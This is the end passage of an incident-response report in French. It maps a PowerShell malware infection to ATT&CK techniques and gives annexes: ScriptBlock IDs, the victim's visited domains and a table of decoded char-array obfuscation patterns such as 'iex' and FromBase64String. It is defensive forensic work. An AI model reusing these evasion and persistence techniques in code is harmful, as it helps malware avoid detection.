| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Stage 1+2 |
| Execution | System Binary Proxy Execution: Rundll32 | T1218.011 | Chargement DLL distante |
| Defense Evasion | Hijack Execution Flow: DLL Side-Loading | T1574.002 | `FNPLicensingService.exe` |
| Defense Evasion | Obfuscated Files or Information | T1027 | RC4 + base64 + junk code |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 | Suppression du `.tmp` après extraction ZIP |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | `Intel\GPUCache\intcache\`, nom `FNPLicensingService.exe` |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | `Register-ScheduledTask` 10 min × 365 j |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HttpClient HTTPS |
| Command and Control | Encrypted Channel: Symmetric Cryptography | T1573.001 | RC4 |
| Command and Control | Web Service | T1102 | C2 hosted as web app |

---

## 12. Annexes

### Annexe A — Liste des ScriptBlock IDs observés

```
06622457-771e-480e-814c-f4b9606e03e9    chunks=3
090708b8-57e9-46b4-8457-e5f9ae2b900d    chunks=4
18288da8-26e0-4796-98ad-4baab6d3b478    chunks=3
3662a090-de88-4962-a3b7-87cfe5048120    chunks=1   (fonction beacon HTTP)
3ce4407b-66b2-4d2e-aeb0-502028b8c30b    chunks=1
481f2947-08b5-4ef2-b23e-3e0bc2879ef5    chunks=1
4b4f9aa3-a851-43a4-9a66-889dbc1fdb74    chunks=3
4c8aea3e-76fb-40c6-aaa3-ba5fc9509f91    chunks=21  (Stage 2 — ZIP/Sched/HTTP)
57deede3-d288-4dc1-82f9-979cc82531cc    chunks=6
62b3b24d-e89b-443c-b3b9-e6191b5309e8    chunks=3
7528e419-9679-4745-ac75-c17e88b10e08    chunks=4
797b715c-82cc-405f-a7f5-a0788d463c80    chunks=3
7d9b6440-6f0a-4fc1-9dba-4541b49571fd    chunks=1
7fd68644-133e-462a-a099-cfc90f525543    chunks=4
8b5668ac-136a-4543-84db-a862c8bcce51    chunks=15
947b60a1-8a8c-4e95-9d32-04eb1df83a78    chunks=1
a2c3b990-3398-40e0-a063-e6c99f4562e7    chunks=2
a81d5bef-085f-4071-adc6-072162c7bbc2    chunks=1   (filtre callback à 12:00)
a8d47658-fa84-4f18-b149-7a66131aab75    chunks=3
ae990e6e-1ae5-4d21-a36f-386583a1ee28    chunks=1
b0356f1c-e701-4b88-a76c-e497f25a69c2    chunks=1
b1eae3ed-827a-4fbf-bcb7-d8b5312bf3b4    chunks=3
b1f8d486-ebba-4774-aff9-6be00e1ac6ec    chunks=4
c7ebd689-d485-4634-8987-c685e9e78183    chunks=66  (★ Loader Stage 1)
e2531162-86cb-4ce5-ad95-a2433b10bfd2    chunks=4
e5df6ebf-303a-4aa0-af7b-f6dff38e959d    chunks=1
e628f059-eabb-438e-9810-bf8554a1f04e    chunks=2
ed3565fc-2cce-446b-8912-5a01fe811be6    chunks=3
f0553296-0f96-4c79-8e46-967530f6465c    chunks=4
f6772529-9890-4262-a2d3-e8471553c418    chunks=2
```

### Annexe B — Domaines visités le 27/03/2026 (matin)

```
68 www.facebook.com
41 www.google.com
13 iziway.cm
 5 dbeaver.io
 3 virtualcliniccm.org
 3 simbockhillsplasticsurgery.com
 3 www.locanto.cm
 3 www.carimoempire.com
 2 gemini.google.com
 1 l.facebook.com
 1 wa.me
 1 api.whatsapp.com
 1 www.medespoir.com
 1 mrsolde.cm
```

Aucun domaine suspect identifié dans cette liste — confirmant que la page malveillante n'a pas été enregistrée dans l'historique Chrome (mode incognito présumé).

### Annexe C — Liste partielle des décodages d'obfuscation observés

| Pattern obfusqué | Valeur en clair |
|---|---|
| `[char[]]@(105,101,120)` | `iex` (Get-Alias for Invoke-Expression) |
| `[char[]]@(83,121,115,116,101,109,46,67,111,110,118,101,114,116)` | `System.Convert` |
| `[char[]]@(83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103)` | `System.Text.Encoding` |
| `[char[]]@(70,114,111,109,66,97,115,101,54,52,83,116,114,105,110,103)` | `FromBase64String` |
| `[char[]]@(85,84,70,56)` | `UTF8` |
| `[char[]]@(71,101,116,66,121,116,101,115)` | `GetBytes` |
| `[char[]]@(71,101,116,83,116,114,105,110,103)` | `GetString` |
| `[char[]]@(84,111,83,116,114,105,110,103)` | `ToString` |
| `[char[]]@(83,101,110,100,65,115,121,110,99)` | `SendAsync` |
| `[char[]]@(77,97,99,104,105,110,101,71,117,105,100)` | `MachineGuid` |
| `[char[]]@(71,101,116,45,67,104,105,108,100,73,116,101,109)` | `Get-Childitem` |
| `[char[]]@(83,101,108,101,99,116,45,79,98,106,101,99,116)` | `Select-Object` |
| `[char[]]@(70,117,108,108,78,97,109,101)` | `FullName` |

---

**Fin du rapport**

*Investigation menée à partir des artefacts collectés sur le poste compromis. Validation et corrélation effectuées le 04/05/2026. En cas de doute ou de besoin d'analyse complémentaire, contacter le CERT.*
